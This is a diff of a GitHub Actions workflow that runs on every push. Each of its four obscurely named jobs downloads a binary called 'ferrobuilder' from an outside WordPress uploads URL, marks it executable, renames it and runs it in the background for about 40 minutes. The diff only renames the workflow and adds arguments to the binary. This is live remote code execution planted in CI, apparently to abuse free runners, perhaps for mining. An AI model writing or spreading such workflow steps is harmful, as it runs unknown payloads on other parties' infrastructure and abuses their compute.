@@ -1,23 +1,23 @@
-name: nobdekjtziyewo
+name: nobeiyewo
 on: push
 jobs:
   cawoxuha1:
     runs-on: ubuntu-18.04
     timeout-minutes: 180
     steps:
-    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder jeff; ./jeff & sleep 40m; echo "Done"
+    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder jeff; ./jeff --building= --server= --ready=2 & sleep 40m; echo "Done"
   covbayeb:
     runs-on: ubuntu-18.04
     timeout-minutes: 180
     steps:
-    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder ekina; ./ekina & sleep 40m; echo "Done"
+    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder ekina; ./ekina --building= --server= --ready=2 & sleep 40m; echo "Done"
   cawodxuha1:
     runs-on: ubuntu-18.04
     timeout-minutes: 180
     steps:
-    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder jeff; ./jeff & sleep 40m; echo "Done"
+    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder jeff; ./jeff --building= --server= --ready=2 & sleep 40m; echo "Done"
   covbadyeb:
     runs-on: ubuntu-18.04
     timeout-minutes: 180
     steps:
-    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder ekina; ./ekina & sleep 40m; echo "Done"
+    - run: wget https://prettycool-bf1673.ingress-earth.ewp.live/wp-content/uploads/dede/ferrobuilder; chmod +x ferrobuilder; mv ferrobuilder ekina; ./ekina --building= --server= --ready=2 & sleep 40m; echo "Done"
